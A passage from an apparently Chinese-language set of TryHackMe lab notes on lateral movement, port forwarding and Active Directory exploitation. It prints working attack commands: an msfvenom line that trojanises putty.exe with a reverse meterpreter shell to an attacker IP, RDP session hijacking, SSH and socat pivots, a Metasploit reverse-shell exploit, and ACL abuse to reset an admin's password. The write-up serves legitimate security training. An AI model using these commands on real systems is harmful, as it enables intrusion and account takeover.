</span><span style="color: #98C379">windows</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-x</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">putty.exe</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-k</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows/meterpreter/reverse_tcp</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">lhost=</span><span style="color: #ABB2BF">&lt;</span><span style="color: #98C379">attacker_i</span><span style="color: #ABB2BF">p&gt; </span><span style="color: #98C379">lport=</span><span style="color: #D19A66">4444</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-b</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;\x00&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">exe</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-o</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">puttyX.exe</span></span></code></pre></div></div></figure><h4 id="RDP-劫持"><a href="#RDP-劫持" class="headerlink" title="RDP 劫持"></a>RDP 劫持</h4><p>当管理员使用远程桌面连接到计算机并关闭 RDP 客户端而不是注销时，他的会话将在服务器上无限期地保持打开状态。如果您在 Windows Server 2016 及更早版本上拥有 SYSTEM 权限，就可以接管任何现有的 RDP 会话，而无需密码。</p><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF"># 用 SYSTEM 账户的权限来启动一个 cmd.exe</span></span><span class="line"><span style="color: #ABB2BF">c:/</span><span style="color: #E06C75">tools</span><span style="color: #ABB2BF">/PsExec64.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">s</span><span style="color: #ABB2BF"> cmd.exe</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"># 查询活动会话</span></span><span class="line"><span style="color: #ABB2BF">query user</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"># 连接会话 /</span><span style="color: #E06C75">dest</span><span style="color: #ABB2BF">: 是我们目前的会话 前面的数字 </span><span style="color: #D19A66">3</span><span style="color: #ABB2BF"> 是我们要连接的会话</span></span><span class="line"><span style="color: #ABB2BF">tscon </span><span style="color: #D19A66">3</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">dest</span><span style="color: #ABB2BF">:</span><span style="color: #E06C75">rdp</span><span style="color: #ABB2BF">-</span><span style="color: #E06C75">tcp</span><span style="color: #ABB2BF">#</span><span style="color: #D19A66">6</span></span></code></pre></div></div></figure><p>Windows Server 2019 及以上的系统就不允许连接到其他的用户会话了</p><h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>我们介绍的大多数横向移动技术都需要特定端口供攻击者使用。在现实世界的网络中，管理员可能出于安全原因屏蔽了其中一些端口，或者在网络周围实施了隔离，从而阻止你访问 SMB、RDP、WinRM 或 RPC 端口。</p><p>要绕过这些限制，我们可以使用端口转发技术，即把任何被入侵的主机作为跳转箱，转到其他主机。由于企业中的每个角色对日常工作所需的网络服务都有不同的需求，因此预计某些机器会比其他机器拥有更多的网络权限。</p><h3 id="SSH-隧道"><a href="#SSH-隧道" class="headerlink" title="SSH 隧道"></a>SSH 隧道</h3><p>在被攻击机上往往没有 SSH 服务端，我们需要反向连回来打通隧道</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 创建一个专门给隧道用的用户</span></span><span class="line"><span style="color: #61AFEF">useradd</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">tunneluser</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-m</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-d</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/home/tunneluser</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-s</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/bin/</span><span style="color: #D19A66">true</span></span><span class="line"><span style="color: #61AFEF">passwd</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">tunneluser</span></span></code></pre></div></div></figure><h4 id="SSH-远程端口转发"><a href="#SSH-远程端口转发" class="headerlink" title="SSH 远程端口转发"></a>SSH 远程端口转发</h4><p>即把远程端口转移到本地，本地主动发起连接。</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/49401a0687c38a1ce78fdd5852aca5a7.png" alt="SSH remote port forwarding" data-caption="SSH remote port forwarding" loading="lazy"></p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 1.1.1.1 是攻击机的 IP</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 3389:3.3.3.3:3389 攻击机端口:目的机器IP:目的端口</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># -N 是不请求 shell</span></span><span class="line"><span style="color: #61AFEF">ssh</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">tunneluser@1.1.1.1</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-R</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">3389</span><span style="color: #98C379">:3.3.3.3:3389</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-N</span></span></code></pre></div></div></figure><h4 id="SSH-本地端口转发"><a href="#SSH-本地端口转发" class="headerlink" title="SSH 本地端口转发"></a>SSH 本地端口转发</h4><p>把本地端口转移到对面，对面主动发起连接。</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/23c086c89a5bbe2fa364c95064235fb5.png" alt="SSH Local Port Forwarding" data-caption="SSH Local Port Forwarding" loading="lazy"></p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># *:80 监听所有网络接口的 80 端口</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 127.0.0.1:80 是攻击机的的本地回环地址和端口</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 也可以这样 192.168.244.1:8080 这样就转发到了攻击机的内网的机器上了</span></span><span class="line"><span style="color: #61AFEF">ssh</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">tunneluser@1.1.1.1</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-L</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">*</span><span style="color: #98C379">:80:127.0.0.1:80</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-N</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 因为开了一个 80 的监听端口，防火墙策略也要放开</span></span><span class="line"><span style="color: #61AFEF">netsh</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">advfirewall</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">firewall</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">add</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">rule</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">name=&quot;Open Port 80&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">dir=in</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">action=allow</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">protocol=TCP</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">localport=</span><span style="color: #D19A66">80</span></span></code></pre></div></div></figure><h3 id="socat-端口转发"><a href="#socat-端口转发" class="headerlink" title="socat 端口转发"></a>socat 端口转发</h3><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 监听本地 1234 端口 把流量都转发到 1.1.1.1:4321 去</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># fork 选项允许为每个收到的连接分叉一个新进程</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 如果不带这个参数一次连接就会断开了</span></span><span class="line"><span style="color: #61AFEF">socat</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">TCP4-LISTEN:1234,fork</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">TCP4:1.1.1.1:4321</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 转发内网机器3.3.3.3的 3389 端口暴露到本地 3389 端口</span></span><span class="line"><span style="color: #61AFEF">socat</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">TCP4-LISTEN:3389,fork</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">TCP4:3.3.3.3:3389</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 添加防火墙规则</span></span><span class="line"><span style="color: #61AFEF">netsh</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">advfirewall</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">firewall</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">add</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">rule</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">name=&quot;Open Port 3389&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">dir=in</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">action=allow</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">protocol=TCP</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">localport=</span><span style="color: #D19A66">3389</span></span></code></pre></div></div></figure><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d7128a0e5d344785ed570c2b8b90c775.png" alt="SOCAT port forwarding 1" data-caption="SOCAT port forwarding 1" loading="lazy"></p><h3 id="动态端口转发和-SOCKS"><a href="#动态端口转发和-SOCKS" class="headerlink" title="动态端口转发和 SOCKS"></a>动态端口转发和 SOCKS</h3><p>其实这个有点误解人，我不太理解他的意思，看起来好像 SSH 自动开了一个 SOCKS 服务端一样，我也没有去尝试他。</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">ssh tunneluser@1.1.1.1 -R 9050 -N</span></span></code></pre></div></div></figure><h3 id="RDP-转发实践"><a href="#RDP-转发实践" class="headerlink" title="RDP 转发实践"></a>RDP 转发实践</h3><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">ssh </span><span style="color: #E06C75">za</span><span style="color: #ABB2BF">\\terence.lloyd@thmjmp2.za.tryhackme.com</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">C:\</span><span style="color: #E06C75">tools</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">socat</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">socat</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">TCP4</span><span style="color: #ABB2BF">-</span><span style="color: #E06C75">LISTEN</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">13389</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75">fork</span><span style="color: #ABB2BF"> TCP4:THMIIS.za.tryhackme.com:</span><span style="color: #D19A66">3389</span></span></code></pre></div></div></figure><h3 id="隧道复杂利用"><a href="#隧道复杂利用" class="headerlink" title="隧道复杂利用"></a>隧道复杂利用</h3><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># SSH 端口转发</span></span><span class="line"><span style="color: #61AFEF">ssh</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">tunneluser@10.50.46.241</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-R</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">8888</span><span style="color: #98C379">:thmdc.za.tryhackme.com:80</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-L</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">*</span><span style="color: #98C379">:6666:127.0.0.1:6666</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-L</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">*</span><span style="color: #98C379">:7878:127.0.0.1:7878</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-N</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 开启 SSH 服务</span></span><span class="line"><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">systemctl</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">start</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">ssh</span></span></code></pre></div></div></figure><p>执行 RCE</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">msfconsole</span></span><span class="line"><span style="color: #61AFEF">use</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">rejetto_hfs_exec</span></span><span class="line"><span style="color: #56B6C2">set</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">payload</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows/shell_reverse_tcp</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 小马要在远端机器上访问的地址</span></span><span class="line"><span style="color: #56B6C2">set</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">lhost</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">thmjmp2.za.tryhackme.com</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 强制监听地址是 127.0.0.1 如果不填的话，就是 LHOST 的值</span></span><span class="line"><span style="color: #56B6C2">set</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">ReverseListenerBindAddress</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">127.0</span><span style="color: #98C379">.0.1</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 跳板机 7878 端口转发到我们本地 7878 端口</span></span><span class="line"><span style="color: #56B6C2">set</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">lport</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">7878</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># Payload 监听地址</span></span><span class="line"><span style="color: #56B6C2">set</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">srvhost</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">127.0</span><span style="color: #98C379">.0.1</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># Payload 监听端口 http://thmjmp2.za.tryhackme.com:6666/4pdqhjQTjbrGJW</span></span><span class="line"><span style="color: #56B6C2">set</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">srvport</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">6666</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">set</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">rhosts</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">127.0</span><span style="color: #98C379">.0.1</span></span><span class="line"><span style="color: #56B6C2">set</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">rport</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">8888</span></span><span class="line"><span style="color: #61AFEF">exploit</span></span></code></pre></div></div></figure><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><ul><li><a href="https://github.com/sshuttle/sshuttle">Sshuttle</a></li><li><a href="https://github.com/klsecservices/rpivot">Rpivot</a></li><li><a href="https://github.com/jpillora/chisel">Chisel</a></li><li><a href="https://adepts.of0x.cc/shadowmove-hijack-socket/">Hijacking Sockets with Shadowmove</a></li></ul><hr><h1 id="Exploiting-Active-Directory"><a href="#Exploiting-Active-Directory" class="headerlink" title="Exploiting Active Directory"></a>Exploiting Active Directory</h1><p>房间：<a href="https://tryhackme.com/room/exploitingad">https://tryhackme.com/room/exploitingad</a></p><p>时间：20250804 23:30 - 20250806 03:50 </p><hr><h2 id="Exploiting-Permission-Delegation"><a href="#Exploiting-Permission-Delegation" class="headerlink" title="Exploiting Permission Delegation"></a>Exploiting Permission Delegation</h2><p>Active Directory 通过一个名为<strong>权限委派 (Permission Delegation)</strong> 的功能来委派权限和特权。一般只有很少的用户拥有 DA（域管理员）凭据的访问权限。不可能让他们处理所有来自用户的请求，例如重置他们的密码。通过使用委派，我们可以将强制更改用户密码的权限委派给 IT 服务台团队，这意味着他们现在对这个特定功能拥有了委派的特权。原则上，为了保证委派的安全性，应该遵循<strong>最小权限原则</strong>。</p><p>权限委派漏洞通常被称为 ACL-based attacks (基于 ACL 的攻击)。AD 允许管理员配置访问控制条目 (ACEs)，这些条目构成了自由访问控制列表 (DACLs)，因此得名 ACL-based attacks。几乎任何 AD 对象都可以通过 ACEs 进行安全保护，这些 ACEs 描述了其他 AD 对象对该目标对象拥有的允许和拒绝的权限。</p><p>如果 ACEs 配置错误，攻击者就可以从他们下手。如果 IT 支持团队被授予了对 <strong>Domain Users</strong>（域用户）组的 <strong>ForceChangePassword</strong>（强制更改密码）权限，这将被视为不安全的。虽然他们能够重置忘记密码的员工的密码，但这种配置错误也可能让他们重置特权账户的密码，比如那些属于 <strong>Domain Admins</strong>（域管理员）组的账户，从而<strong>实现权限提升</strong>。</p><h3 id="ACEs"><a href="#ACEs" class="headerlink" title="ACEs"></a>ACEs</h3><p>大量的 ACEs 可能会被错误的配置，然后他们的利用方式也很多，Bloodhound 的文档可以帮助解释被枚举出来的 ACEs 以及如何利用它们。以下是几个典型的</p><ul><li><p><strong>ForceChangePassword:</strong> 我们能在不知道用户密码的情况下重置密码</p></li><li><p><strong>AddMembers:</strong> 我们有将用户（包括当前用户），组和计算机加入目标组的权限。</p></li><li><p><strong>GenericAll:</strong> 我们可以完全控制该对象，包括更改用户密码、注册 SPN 或向目标组添加 AD 对象。</p></li><li><p><strong>GenericWrite:</strong> 我们可以更新目标对象的任何非保护参数。例如，这可以让我们更新 scriptPath 参数，从而在用户下次登录时执行脚本。</p><ul><li><p>“非保护参数”（non-protected parameters）指的是那些<strong>不会被 AdminSDHolder 机制保护的属性</strong>。</p><p>简单来说，Active Directory 有一套内置的安全机制，叫做 AdminSDHolder，专门用来保护高权限账户和组（如 Domain Admins）。这个机制会定期检查这些高权限对象，并强制重置它们的 ACL，以防止权限被错误修改。</p></li></ul></li><li><p><strong>WriteOwner:</strong> 我们可以更新目标对象的所有者。我们可以让自己成为所有者，从而获得对该对象的更多权限。</p></li><li><p><strong>WriteDACL:</strong> 我们可以向目标对象的 DACL 写入新的 ACE。例如，我们可以编写一个 ACE，授予我们的账户对目标对象的完全控制权。</p></li><li><p><strong>AllExtendedRights:</strong> 我们可以对目标对象执行任何与扩展 AD 权限相关的操作。例如，这包括强制更改用户密码的功能。</p></li></ul><p>为了利用这些 ACE，我们需要一种与 AD 交互的方法来发出这些请求。这方面的两个最佳选择是 AD-RSAT PowerShell cmdlets 或 PowerSploit。根据漏洞和环境中的检测工具，其中一种方法可能更隐蔽。在本任务中，我们将展示这两种方法。</p><h3 id="Bloodhound-1"><a href="#Bloodhound-1" class="headerlink" title="Bloodhound"></a>Bloodhound</h3><p>因为我用的是提供执行好的文件，就没有自己跑 Sharphound 了，把结果导入 Bloodhound 后，搜索拿到的用户名。</p><p>在 Node Info -&gt; EXECUTION RIGHTS -&gt; Group Delegated RDP Privileges 看到 DOMAIN USERS 有能访问 THMWRK1 的 <code>RDP</code> 权限。</p><p>然后在 Node Info -&gt; OUTBOUND CONTROL RIGHTS -&gt; Group Delegated Object 看到 DOMAIN USERS 有对 IT SUPPORT 的 <code>GenericWrite</code> 权限。</p><p>然后我们一般是要拿到高权限用户的权限，所以用 BloodHound 的检索功能，把自己的账户放到首位，<code>TIER 2 ADMINS@ZA.TRYHACKME.LOC</code> 放到目标，生成一个图出来。</p><img src="/thm_ad/image-20250805011844795.png" class="" title="image-20250805011844795"><p>可以看到我们的用户组有对 IT SUPPORT 的 <code>GenericWrite</code> 权限，然后 IT SUPPORT 组有对 T2 组的强制改密码权限。当一个用户对一个组拥有 <code>GenericWrite</code> 权限时，就意味着他可以修改这个组的任何属性，包括 <code>member</code> 属性。</p><h4 id="AddMember"><a href="#AddMember" class="headerlink" title="AddMember"></a>AddMember</h4><p>我们会用 AD-RSAT 工具集中的 <code>Add-ADGroupMember</code> PowerShell cmdlet 实现这个功能。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 把我们的用户加入 IT Support 组</span></span><span class="line"><span style="color: #56B6C2">Add-ADGroupMember</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;IT Support&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Members </span><span style="color: #98C379">&quot;barbara.reid&quot;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 查看 IT Support 组成员</span></span><span class="line"><span style="color: #56B6C2">Get-ADGroupMember</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity </span><span style="color: #98C379">&quot;IT Support&quot;</span></span></code></pre></div></div></figure><h4 id="强制改密码"><a href="#强制改密码" class="headerlink" title="强制改密码"></a>强制改密码</h4><p>现在我们的账户已经是 IT Support 组成员了，所以有对 Tier 2 组改密码的权限。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 查看 T2 管理员组成员 找一个受害者</span></span><span class="line"><span style="color: #56B6C2">Get-ADGroupMember</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity </span><span style="color: #98C379">&quot;Tier 2 Admins&quot;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 新建密码变量</span></span><span class="line"><span style="color: #E06C75">$Password</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">ConvertTo-SecureString</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;Pass123...&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">AsPlainText </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Force </span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 更改密码</span></span><span class="line"><span style="color: #56B6C2">Set-ADAccountPassword</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity </span><span style="color: #98C379">&quot;t2_melanie.davies&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Reset </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">NewPassword </span><span style="color: #E06C75">$Password</span><span style="color: #ABB2BF"> </span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 如果提示拒绝，执行这个断开连接再连接</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 还不行就等 10 分钟左右</span></span><span class="line"><span style="color: #ABB2BF">gpupdate </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">force</span></span></code></pre></div></div></figure><h2 id="Exploiting-Kerberos-Delegation"><a href="#Exploiting-Kerberos-Delegation" class="headerlink" title="Exploiting Kerberos Delegation"></a>Exploiting Kerberos Delegation</h2><h3 id="Kerberos-Double-Hop-issue"><a href="#Kerberos-Double-Hop-issue" class="headerlink" title="Kerberos Double Hop issue"></a>Kerberos Double Hop issue</h3><p>客户端希望使用 Kerberos 对第一台服务器（Hop 1）进行身份验证，而第一台服务器需要代表客户端访问第二台服务器（Hop 2）上的资源。常见的情况是用户访问前端应用程序时需要修改数据库服务器上的资源。</p><p>原始的 Kerberos 无法告诉第一台服务器：”OK，你可以访问服务器上的资源了： “您可以代表客户访问第 2 服务器上的资源。”</p><h4 id="原始-Kerberos-协议的局限性"><a href="#原始-Kerberos-协议的局限性" class="headerlink" title="原始 Kerberos 协议的局限性"></a>原始 Kerberos 协议的局限性</h4><p>原始 Kerberos 协议的流程是这样的：</p><ol><li><strong>用户</strong>向 <strong>KDC (密钥分发中心)</strong> 证明自己的身份，并获得一个 **TGT (票据授权票据)**。</li><li><strong>用户</strong>使用这个 TGT 向 KDC 请求一个专门用于访问 <strong>Hop 1 服务器</strong>的 **TGS (服务票据)**。</li><li><strong>用户</strong>使用这个 TGS 向 <strong>Hop 1 服务器</strong>进行身份验证，并开始通信。</li></ol><p>到这里，整个流程就结束了。Kerberos 的设计只考虑了客户端（用户）和第一个服务器（Hop 1）之间的通信。</p><h4 id="为什么不能简单地转发-TGS？"><a href="#为什么不能简单地转发-TGS？" class="headerlink" title="为什么不能简单地转发 TGS？"></a>为什么不能简单地转发 TGS？</h4><ul><li><strong>TGS 的加密机制</strong>：用户从 KDC 获得的 TGS 是用 <strong>Hop 1 服务器的密钥</strong>加密的。只有 Hop 1 服务器能解密它，并从中获得会话密钥。</li><li><strong>无法将 TGS 转发给 Hop 2</strong>：Hop 2 服务器无法解密这个 TGS，因为它没有 Hop 1 服务器的密钥。因此，用户不能简单地将 TGS 转发给 Hop 2。</li><li><strong>权限绑定</strong>：TGS 明确绑定了<strong>一个用户</strong>和<strong>一个特定服务</strong>。它不包含任何“代表他人”去访问其他服务的权限。原始协议没有“委托（delegation）”的概念。</li></ul><h4 id="解决方案：Kerberos-委派（Kerberos-Delegation）"><a href="#解决方案：Kerberos-委派（Kerberos-Delegation）" class="headerlink" title="解决方案：Kerberos 委派（Kerberos Delegation）"></a>解决方案：Kerberos 委派（Kerberos Delegation）</h4><p>为了解决这个问题，微软和其他组织对 Kerberos 协议进行了扩展，引入了 <strong>Kerberos 委派</strong>的功能。</p><p>委派的核心思想是允许<strong>服务</strong>（例如 Hop 1 服务器）以<strong>用户的身份</strong>去向 KDC 请求一个新的 TGS，这个新的 TGS 是专门用于访问<strong>其他服务</strong>（例如 Hop 2 服务器）的。</p><p>这就是为什么现在有<strong>非约束性委派 (Unconstrained Delegation)</strong> 和<strong>约束性委派 (Constrained Delegation)</strong> 等多种委派形式。它们都是对原始 Kerberos 协议的增强，专门用于处理多跳的身份验证场景。</p><h3 id="Constrained-vs-Unconstrained"><a href="#Constrained-vs-Unconstrained" class="headerlink" title="Constrained vs Unconstrained"></a>Constrained vs Unconstrained</h3><p>Kerberos 委派有两种类型。在 Kerberos 委派最初的实现中，使用了**非约束性委派 (Unconstrained Delegation)**，这是最不安全的方法。</p><p>本质上，非约束性委派对委派没有施加任何限制。它的后台工作原理是：如果一个设置了 <code>TRUSTED_FOR_DELEGATION</code> 标志的用户在一个配置了非约束性委派的主机上进行身份验证，那么就会为这个用户账户生成一个 <strong>TGT</strong>，并将其存储在主机的内存中，以便将来需要时使用。</p><p>假设攻击者能够攻陷一个启用了非约束性委派的主机，他们就可以尝试强制一个特权账户（如域管理员）向该主机进行身份验证，这使他们能够拦截生成的 TGT，并冒充这个特权服务。如果你想看一个非约束性委派利用的例子，可以看<a href="https://medium.com/@riccardo.ancarani94/exploiting-unconstrained-delegation-a81eabbd6976">这里</a>。</p><p>为了克服无约束委托的安全缺陷，微软在 2003 年推出了受限委托。受限委托限制了账户可以委托给哪些服务，从而在账户受到威胁时限制了风险。以下是可配置授权的服务示例：</p><ul><li>HTTP - 用于 Web 应用程序，允许使用 AD 凭据进行<strong>直通式（pass-through）身份验证</strong>。</li><li>CIFS - <strong>Common Internet File System</strong>，用于文件共享，允许将用户委派到文件共享。</li><li>LDAP - 用于委派给 LDAP 服务，执行诸如<strong>重置用户密码</strong>之类的操作。</li><li>HOST - 